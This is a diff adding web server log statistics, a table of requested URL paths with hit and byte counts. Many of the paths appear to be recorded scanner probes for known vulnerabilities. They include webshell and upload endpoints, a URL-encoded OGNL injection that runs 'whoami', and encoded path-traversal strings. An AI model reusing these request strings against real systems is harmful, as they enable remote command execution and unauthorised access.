+/ftp.json 1 7520 0 0
+/service/extdirect 1 8742 0 0
+/mailingupgrade.php 1 8742 0 0
+/mgmt/shared/iapp/rpm-spec-creator 1 8742 0 0
+/authenticationendpoint/32b4qelxwzc2fmysd7uug8emisv.jsp 1 8742 0 0
+/user_uploads 1 7520 0 0
+/apisix/batch-requests 1 8742 0 0
+/admin/index.php 1 8742 0 0
+/form 1 7520 0 0
+/fuel/pages/select/ 1 8742 0 0
+/elFinder/php/connector.minimal.php 1 8742 0 0
+/32B4qIjKjPhvOQ1ePWGSRABkGze.jsp 1 8742 0 0
+/api/experimental/test 1 8742 0 0
+/webshell 2 92560 2 2
+/32B4qDNZlvfK1Z5c8sC2wQI5GKn.jsp 1 8742 0 0
+/EeMnG2ElGax6.jsp 1 8742 0 0
+/node/add/webform 1 7520 0 0
+/test.php 1 8742 0 0
+/media/upload 1 7520 0 0
+/apply_sec.cgi 3 26226 0 0
+/api/agent/tabs/agentData 1 8742 0 0
+/user.action 1 8742 0 0
+/chaosblade 1 8742 0 0
+/password_change.cgi 1 8742 0 0
+/Collector/diagnostics/trace_route 1 8742 0 0
+/deployment-config.json 1 7520 0 0
+/NmAPI/RecurringReport 1 8742 0 0
+/sites/default/files/webform/uploads 1 7520 0 0
+/.vscode/ftpconfig.json 1 7520 0 0
+/STATE_ID/123/agentLogUploader 1 8742 0 0
+/management/export.php 1 8742 0 0
+/static/uploads 1 7520 0 0
+/data/cache_template/rss.tpl.php 1 8742 0 0
+//wp1/wp-includes/wlwmanifest.xml 4 185120 0 0
+/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08 1 8742 0 0
+/wp-admin/admin-post.php 1 8742 0 0
+/login/ 2 17484 0 0
+/config.json 1 7520 0 0
+/WSStatusEvents/EventHandler.asmx 1 8742 0 0
+/photo/p/api/album.php 2 17484 0 0
+/dup-installer/main.installer.php 1 7520 0 0
+/vendor/htmlawed/htmlawed/htmLawedTest.php 3 26226 0 0
+/var 1 8742 0 0
+/auth/check 1 8742 0 0
+/assets/data/usrimg/32b4qcgadbxcd020laeixomeqpc.php 1 8742 0 0
+/include/exportUser.php 1 8742 0 0
+/ALFA_DATA/alfacgiapi 1 7520 1 0
+/attachments/new 1 7520 0 0
+/test.hello 1 8742 0 0
+/sites/default/files/images 1 7520 0 0
+/mifs/. 1 8742 0 0
+/wfs 1 8742 0 0
+/sites/default/files/styles/large/public 1 7520 0 0
+/file-manager/ 1 8742 0 0
+/crowd/admin/uploadplugin.action 1 8742 0 0
+/objects/getImageMP4.php 1 8742 0 0
+/run 1 8742 0 0
+/upload 4 32524 0 0
+/alfacgiapi/ 1 7520 0 0
+/api/clusters 1 8742 0 0
+/API/regionsDiscovery.php 1 8742 0 0
+/upload-document 1 7520 0 0
+/loadfile.lp 1 8742 0 0
+/account 2 17484 0 0
+/nagiosxi/login.php 3 26226 0 0
+/api/content/ 1 8742 0 0
+/ftp-config.json 1 7520 0 0
+/webtools/control/main/ProgramExport 2 17484 0 0
+/WORDPRESS 1 0 0 0
+/wp-content/plugins/wsecure/wsecure-config.php 1 8742 0 0
+/modules/Rubrics/rubrics_visualise_saveAjax.php 1 8742 0 0
+/webform/submit 1 7520 0 0
+/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ 1 8742 0 0
+/node_modules/angular-base64-upload/demo/server.php 1 8742 0 0
+/classes/common/busiFacade.php 1 8742 0 0
+/_images/4ylKWz 1 8742 0 0
+/%2577eb%2575i_%2577sma_Http 1 8742 0 0
+/PhoneBackup/GUAWBOwt.php 2 17484 0 0
+/login.action 3 26226 0 0
+/tmui/login.jsp/.. 3 26226 0 0
+/human.aspx 1 8742 0 0
+/OA_CGI/FNDWRR.exe 1 8742 0 0
+/task/submit/ 1 8742 0 0
+/api/push 1 8742 0 0
+/ajax-api/2.0/mlflow/model-versions/create 2 17484 0 0
+/xmlrpc 1 8742 0 0
+/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php 1 8742 0 0
+/api/v1 1 8742 0 0
+/bower_components/angular-base64-upload/demo/server.php 1 8742 0 0
+/32B4qFtDnaPQ4A4Thq4ku40IoP1 1 8742 0 0
+/tmui/locallb/workspace/fileSave.jsp 1 8742 0 0
+/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php 1 8742 0 0
+/app/options.py 3 26226 0 0
+/php-cgi/php-cgi.exe 1 8742 0 0
+/pages/createpage-entervariables.action 3 26226 0 0
+/32B4qG3qVm3ebgZl9m1Yli3FtaN.jsp/ 1 8742 0 0
+/esp/cms_changeDeviceContext.esp 1 8742 0 0
+//wp2/wp-includes/wlwmanifest.xml 4 185120 0 0
+/tools.cgi 2 17484 0 0
+/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm 1 8742 0 0
+/lucee/32B4qFJZ7VkGSK4KsUTtHk8hhmo.cfm 1 8742 0 0
+/csrf 1 8742 0 0
+/__debugging_center_utils___.php 2 17484 0 0
+/network_test.php 1 8742 0 0
+//wp/wp-includes/wlwmanifest.xml 4 185120 0 0
+/simpleeditor/common/commonReleaseNotes.do 1 8742 0 0
+/web/google_analytics.php 1 8742 0 0
+/pfblockerng/www/index.php 1 8742 0 0
+/talari/app/files/32B4qGDWPkC6bRLQ5jYeJ9yeKv5 1 8742 0 0
+/graph_realtime.php 1 8742 0 0
+/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/index.php 1 8742 0 0
+/_async/AsyncResponseService 1 8742 0 0
+/jeecg-boot/jmreport/queryFieldBySql 1 8742 0 0
+/api/jobs/ 1 8742 0 0
+/Collector/diagnostics/ping 1 8742 0 0
+/inc/jquery/uploadify/uploadify.php 1 8742 0 0
+/sites/default/files/styles/medium/public/webform/submissions 1 7520 0 0
+/sitemap.xml 1 8742 0 1
+/ddns_check.ccp 1 8742 0 0
+/api/remote 1 8742 0 0
+/templates/editor-preload-container 1 8742 0 0
+/webadmin/out 1 8742 0 0
+/fw.login.php 1 8742 0 0
+/umotion/modules/reporting/track_import_export.php 1 8742 0 0
+/zimbraAdmin/0MVzAe6pgwe5go1D.jsp 2 17484 0 0
+/wp-json/lp/v1/load_content_via_ajax/ 1 8742 0 0
+/servlet/UploadServlet 1 8742 0 0
+//shop/wp-includes/wlwmanifest.xml 4 185120 0 0
+/integration/saveGangster.action 1 8742 0 0
+/wp-content/plugins/wpcargo/includes/32B4qFozswjTr6kasImPPRCUVLj.php 2 17484 0 0
+/wsman 1 8742 0 0
+/bypass/config 1 8742 0 0
+/gremlin 1 8742 0 0
+/EemAdminService/EemAdmin 1 8742 0 0
+/v1/backend1 1 8742 0 0
+/api/hassio_ingress/.%09./supervisor/info 1 8742 0 0
+/boardDataWW.php 1 8742 0 0
+/deserialize 2 17484 0 0
+/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc 1 8742 0 0
+/session/login 1 8742 0 0
+/meta 1 8742 0 0
+/com.example.TestService 1 8742 0 0
+/api/json 3 26226 0 0
+/objects/getImage.php 1 8742 0 0
+/sites/default/files/uploads 1 7520 0 0
+/downloader.php 1 8742 0 0
+/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 1 8742 0 0
+/submit 1 7520 0 0
+/progs/homepage 1 8742 0 0
+/goform/setmac 1 8742 0 0
+/SDK/webLanguage 1 8742 0 0
+/sftp-config-alt.json 1 7520 0 0
+/guestaccess.aspx 1 8742 0 0
+/service/extension/backup/mboximport 2 17484 0 0
+/-/media/doo-doo.ashx 1 8742 0 0
+/.vscode/settings.json 1 7520 0 0
+/api/session/properties 1 8742 0 0
+/users/user-dark-features 1 8742 0 0
+/MagicInfo/servlet/SWUpdateFileUploader 1 8742 0 0
+/api/v1/snapshots 1 8742 0 0
+/content/uploads 1 7520 0 0
+/goform/formWsc 1 8742 0 0
+/wordpress 1 0 0 0
+/html/ad/adpesquisasql/request/processVariavel.php 1 8742 0 0
+/.atom/remote-sync.json 1 7520 0 0
+/login.htm 1 8742 0 0
+/webform 1 7520 0 0
+/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08 1 8742 0 0
+/apriso/portal/kiosk/querylogin.aspx 1 8742 0 0
+/32B4qKd5uJ2K1Mf3exhA5Hcj6sH.php 1 8742 0 0
+/webtools/control/forgotPassword/xmldsdump 1 8742 0 0
+/api/file/formimage 1 8742 0 0
+/php/connector.minimal.php 1 8742 0 0
+/boafrm/formSysCmd 1 8742 0 0
+/Uploads/32B4qIlyH3G8oz8V0OnyeQsDoDx.php7 1 8742 0 0
+/emap/devicePoint_addImgIco 1 8742 0 0
+/confluence/pages/createpage-entervariables.action 2 17484 0 0
+/admin/login 2 17484 0 0
+/sites/default/files/documents 1 7520 0 0
+/GponForm/diag_Form 2 17484 0 0
+/spip.php 2 17484 0 0
+/upload-file 1 7520 0 0
+/mgmt/tm/util/bash 3 26226 0 0
+/api/server/version 2 17484 0 0
+/getsamplebacklog 1 8742 0 0
+/console/images/%252e%252e%252fconsole.portal 1 8742 0 0
+/images/logo/logo-eoffice.php 1 8742 0 0
+/api/jsonws/invoke 2 17484 0 0
+/search.php 1 8742 0 0
+/api/operations/ciscosb-file:form-file-upload 1 8742 0 0
+/v1/api 1 8742 0 0
+/fileupload/toolsAny 1 8742 0 0
+/general/status.html 1 8742 0 0
+/ajax-api/2.0/mlflow/registered-models/create 1 8742 0 0
+/main/webservices/additional_webservices.php 1 8742 0 0
+/sites/default/files/webform/tmp 1 7520 0 0
+/api/v2/observables/extended 1 8742 0 0
+/file-manager/backend/permissions 1 8742 0 0
+/goform/aspForm 1 8742 0 0
+/webadmin/script 1 8742 0 0
+/api/jobs/Job_QOjNJf/logs 1 8742 0 0
+/invoker/EJBInvokerServlet/ 1 8742 0 0
+/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage 1 8742 0 0
+/flash/addcrypted2 2 17484 0 0
+//wp-includes/wlwmanifest.xml 4 185120 0 0
+/app/modules/ut-cac/admin/cli.php 1 8742 0 0
+END_SIDER
+
+# Payload Range - Payload Frequency
+BEGIN_FILESIZE 5
+500-1K 1487
+1K-2K 44
+5K+ 1845
+0-44 20
+2K-5K 74
+END_FILESIZE
+
+# Request Time Range - Request Time Frequency
+BEGIN_REQUESTTIME 0
+END_REQUESTTIME
